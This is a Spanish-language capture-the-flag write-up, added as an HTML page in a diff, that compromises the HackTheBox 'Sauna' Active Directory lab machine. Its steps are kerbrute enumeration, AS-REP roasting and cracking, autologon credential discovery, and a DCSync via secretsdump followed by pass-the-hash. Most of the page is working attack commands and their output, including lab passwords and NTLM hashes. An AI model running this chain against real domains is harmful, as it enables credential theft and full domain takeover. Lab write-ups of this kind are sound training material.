@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Sauna</title>
+
+  <meta name="description" content="Resolución de la máquina Sauna de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Sauna">
+  <meta name="twitter:description" content="Resolución de la máquina Sauna de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/sauna.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Sauna">
+  <meta property="og:description" content="Resolución de la máquina Sauna de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/sauna.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/sauna.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Sauna" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-fsmith">Shell - fsmith</a></li>
+        <li><a href="#shell-svc_loanmgr">Shell - svc_loanmgr</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/sauna.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Sauna</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.175
+Nmap scan report for 10.10.10.175
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49677/tcp open  unknown
+49699/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> ademas del nombre de la maquina obtenemos su <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.175
+</span><span class="az">SMB         </span><span class="p">10.10.10.175  445    SAUNA            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad lo agregamos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.175 egotistical-bank.local" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">kerbrute</code> con un diccionario de <code class="language-plaintext highlighter-rouge">usuarios</code> para enumerar posibles usuarios <code class="language-plaintext highlighter-rouge">validos</code> a través de fuerza bruta mediante <code class="language-plaintext highlighter-rouge">kerberos</code>, encontramos varios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d egotistical-bank.local --dc egotistical-bank.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 05/03/23 - Ronnie Flathers @ropnop
+
+>  Using KDC(s):
+>       egotistical-bank.local:88
+</span><span class="ve">
+>  [+] VALID USERNAME:   administrator@egotistical-bank.local
+>  [+] VALID USERNAME:   hsmith@egotistical-bank.local
+>  [+] VALID USERNAME:   sauna@egotistical-bank.local
+>  [+] VALID USERNAME:   fsmith@egotistical-bank.local</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-fsmith">
+<br><h3 class="post-title">Shell - fsmith</h3><br>
+
+<p class="plain-text">Con esta lista de <code class="language-plaintext highlighter-rouge">usuarios</code> podemos probar un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> Attack para ver si algunos de los usuarios es <code class="language-plaintext highlighter-rouge">vulnerable</code>, <code class="language-plaintext highlighter-rouge">fsmith</code> lo es y nos devuelve su <code class="language-plaintext highlighter-rouge">hash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">egotistical-bank.local/ -no-pass -usersfile users.txt 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3f439edff10b3b3e3d104edd8735a4ea$d377f9b8eb164f20997f4430f9ee72f8627f733e60cb75cba30ceeee0307c6a11acfe71c795b4e73ce878ef3df04e35ebccfaa6b5de6d8eccb337d73e16ccee7b562aeb7d2cf8d0b87738a24cc57e2082639cf85fb44171b2bb2cc3e27c9abee0ed685e24b013d2f2b46cf89856b360241751c5a9b87d6e04547f0f79dc5364cceeec3ff7a7e036892f18421d0d88b5e624cbefcef34d50eae666e085c5336ba76afc6284a286e2f72227692d39f015a0d2747a18c34de80c72692ad2357c1f42ae39fe45a5f7a121af8e44e81f775acaae1c55c836e58f3cdfb15619eb8dde22c4a30204a9ef2e00377033c8403c227627be4b475ca9940e284bc96d2cf08e9  
+[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos crackearlo con <code class="language-plaintext highlighter-rouge">john</code> y obtener la contraseña de <code class="language-plaintext highlighter-rouge">fsmith</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Thestrokes23</span><span class="p">     (</span><span class="am">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al comprobarlas con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos ver que son validas a nivel de <code class="language-plaintext highlighter-rouge">smb</code>, pero no solo eso tambien son validas para <code class="language-plaintext highlighter-rouge">winrm</code> por lo que podemos conectarnos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb egotistical-bank.local -u fsmith -p Thestrokes23
+</span><span class="az">SMB         </span><span class="p">egotistical-bank.local 445    SAUNA            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">egotistical-bank.local 445    SAUNA            </span><span class="ve">[+] </span><span class="p">EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">winrm egotistical-bank.local -u fsmith -p Thestrokes23
+</span><span class="az">SMB         </span><span class="p">egotistical-bank.local 5985   SAUNA            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+</span><span class="az">HTTP        </span><span class="p">egotistical-bank.local 5985   SAUNA            </span><span class="az">[*] </span><span class="p">http://egotistical-bank.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">egotistical-bank.local 5985   SAUNA            </span><span class="ve">[+] </span><span class="p">EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos haciendo uso de <code class="language-plaintext highlighter-rouge">evil-winrm</code> y podemos leer la primera <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i egotistical-bank.local -u fsmith -p Thestrokes23  
+PS C:\Users\FSmith\Documents> </span><span class="am">whoami</span><span class="p">
+egotisticalbank\fsmith
+PS C:\Users\FSmith\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
+608**************************d4e
+PS C:\Users\FSmith\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-svc_loanmgr">
+<br><h3 class="post-title">Shell - svc_loanmgr</h3><br>
+
+<p class="plain-text">Para buscar posibles formas de escañar subimos e importamos el modulo <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp</a></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\FSmith\Documents> </span><span class="am">upload </span><span class="p">PowerUp.ps1
+</span><span class="az">
+Info: Uploading PowerUp.ps1 to C:\Users\FSmith\Documents\PowerUp.ps1  
+</span><span class="sa">
+Data: 660436 bytes of 660436 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\FSmith\Documents> </span><span class="am">Import-Module</span><span class="p"> .\PowerUp.ps1
+PS C:\Users\FSmith\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al <code class="language-plaintext highlighter-rouge">invocar</code> el <code class="language-plaintext highlighter-rouge">modulo</code> y empezara a probar algunas posibles formas de <code class="language-plaintext highlighter-rouge">escalar</code>, entre la información encontramos <code class="language-plaintext highlighter-rouge">credenciales</code> en el apartado de <code class="language-plaintext highlighter-rouge">Autologon</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\FSmith\Documents> </span><span class="am">Invoke-AllChecks</span><span class="p">
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+[*] Checking for unquoted service paths...
+[*] Checking service executable and argument permissions...
+[*] Checking service permissions...
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+HijackablePath : C:\Users\FSmith\AppData\Local\Microsoft\WindowsApps\
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\FSmith\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' -Command '...'  
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+[*] Checking for Autologon credentials in registry...
+
+DefaultDomainName    : EGOTISTICALBANK
+DefaultUserName      : EGOTISTICALBANK\svc_loanmanager
+DefaultPassword      : Moneymakestheworldgoround!
+AltDefaultDomainName :
+AltDefaultUserName   :
+AltDefaultPassword   :
+
+[*] Checking for vulnerable registry autoruns and configs...
+[*] Checking for vulnerable schtask files/configs...
+[*] Checking for unattended install files...
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+PS C:\Users\FSmith\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto tambien podemos verlo con el comando <code class="language-plaintext highlighter-rouge">reg</code> con la query hacia <code class="language-plaintext highlighter-rouge">winlogon</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\FSmith\Documents> </span><span class="am">reg </span><span class="p">query </span><span class="az">"HKLM\software\microsoft\windows nt\currentversion\winlogon" </span><span class="p">| </span><span class="am">Select-String </span><span class="p">DefaultDomainName,DefaultUserName,DefaultPassword  
+
+    DefaultDomainName    REG_SZ    EGOTISTICALBANK
+    DefaultUserName      REG_SZ    EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword      REG_SZ    Moneymakestheworldgoround!
+
+PS C:\Users\FSmith\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al probarlas con <code class="language-plaintext highlighter-rouge">crackmapexec</code> estas no son validas a nivel de <code class="language-plaintext highlighter-rouge">smb</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb egotistical-bank.local -u svc_loanmanager -p Moneymakestheworldgoround!
+</span><span class="az">SMB         </span><span class="p">egotistical-bank.local 445    SAUNA            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">egotistical-bank.local 445    SAUNA            </span><span class="ro">[-] </span><span class="p">EGOTISTICAL-BANK.LOCAL\svc_loanmanager:Moneymakestheworldgoround! STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto es porque el usuario <code class="language-plaintext highlighter-rouge">svc_loanmanager</code> no existe a nivel local ni de <code class="language-plaintext highlighter-rouge">dominio</code>, el usuario que podria ser valido es <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> que es bastante parecido al original</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\FSmith\Documents> </span><span class="am">net </span><span class="p">user /domain
+
+User accounts for \\
+
+-------------------------------------------------------------------  
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+
+PS C:\Users\FSmith\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> con ese usuario y son <code class="language-plaintext highlighter-rouge">validas</code> para <code class="language-plaintext highlighter-rouge">smb</code> y <code class="language-plaintext highlighter-rouge">winrm</code>, podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y obtener una <code class="language-plaintext highlighter-rouge">shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb egotistical-bank.local -u svc_loanmgr -p Moneymakestheworldgoround!
+</span><span class="az">SMB         </span><span class="p">egotistical-bank.local 445    SAUNA            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">egotistical-bank.local 445    SAUNA            </span><span class="ve">[+] </span><span class="p">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! 
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">winrm egotistical-bank.local -u svc_loanmgr -p Moneymakestheworldgoround!
+</span><span class="az">SMB         </span><span class="p">egotistical-bank.local 5985   SAUNA            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+</span><span class="az">HTTP        </span><span class="p">egotistical-bank.local 5985   SAUNA            </span><span class="az">[*] </span><span class="p">http://egotistical-bank.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">egotistical-bank.local 5985   SAUNA            </span><span class="ve">[+] </span><span class="p">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i egotistical-bank.local -u svc_loanmgr -p Moneymakestheworldgoround!  
+PS C:\Users\svc_loanmgr\Documents> </span><span class="am">whoami</span><span class="p">
+egotisticalbank\svc_loanmgr
+PS C:\Users\svc_loanmgr\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Para enumerar la <code class="language-plaintext highlighter-rouge">información</code> y privilegios en el <code class="language-plaintext highlighter-rouge">dominio</code> subiremos el modulo <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound.ps1</a> con la función upload y lo importaremos en la <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc_loanmgr\Documents> </span><span class="am">upload </span><span class="p">SharpHound.ps1
+</span><span class="az">
+Info: Uploading SharpHound.ps1 to C:\Users\svc_loanmgr\Documents\SharpHound.ps1  
+</span><span class="sa">
+Data: 1757460 bytes of 1757460 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\svc_loanmgr\Documents> </span><span class="am">Import-Module </span><span class="p">.\SharpHound.ps1
+PS C:\Users\svc_loanmgr\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Invocamos el <code class="language-plaintext highlighter-rouge">modulo</code> indicando que recolecte toda la información del <code class="language-plaintext highlighter-rouge">dominio</code>, al hacerlo nos creara un <code class="language-plaintext highlighter-rouge">zip</code> con esta que podemos descargar usando <code class="language-plaintext highlighter-rouge">download</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc_loanmgr\Documents> </span><span class="am">Invoke-BloodHound </span><span class="c1">-CollectionMethod </span><span class="p">All
+PS C:\Users\svc_loanmgr\Documents> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\svc_loanmgr\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/4/2023   2:46 AM          11545 20230504024616_BloodHound.zip
+-a----         5/4/2023   2:43 AM        1318097 SharpHound.ps1
+
+PS C:\Users\svc_loanmgr\Documents> </span><span class="am">download </span><span class="p">20230504024616_BloodHound.zip BH.zip
+</span><span class="az">
+Info: Downloading C:\Users\svc_loanmgr\Documents\20230504024616_BloodHound.zip to BH.zip  
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Users\svc_loanmgr\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Subimos el <code class="language-plaintext highlighter-rouge">zip</code> a <code class="language-plaintext highlighter-rouge">bloodhound</code> y listando los usuarios que pueden hacer un <code class="language-plaintext highlighter-rouge">DCSync</code> encontramos al usuario <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> del cual ya tenemos sus <code class="language-plaintext highlighter-rouge">credenciales</code></p>
+<a href="/htb/sauna/1.png" target="_blank"><div><p><img src="/htb/sauna/1.png"></p></div></a>
+
+<p class="plain-text">Hay varias formas pero podemos hacerlo con <code class="language-plaintext highlighter-rouge">secretsdump</code> de <code class="language-plaintext highlighter-rouge">impacket</code> como el usuario <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> para dumpear el <code class="language-plaintext highlighter-rouge">ntds.dit</code> mediante el metodo <code class="language-plaintext highlighter-rouge">drsuapi</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">egotistical-bank.local/svc_loanmgr:</span><span class="am">'Moneymakestheworldgoround!'</span><span class="p">@10.10.10.175  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:376b83bdd4748f9860f4ed97a5beadb0:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:248c72f58cfb209e4c800f0fcb13db3228e798cf033f27483ae5a4270667e620
+SAUNA$:aes128-cts-hmac-sha1-96:96b8e5dd7c7224cbd52a8d824db6274d
+SAUNA$:des-cbc-md5:f89e4c3151206dae
+[*] Cleaning up...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente podemos usar el listado de <code class="language-plaintext highlighter-rouge">hash</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> para mediante un <code class="language-plaintext highlighter-rouge">passthehash</code> conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> para poder leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i egotistical-bank.local -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+egotisticalbank\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+265**************************fa3
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
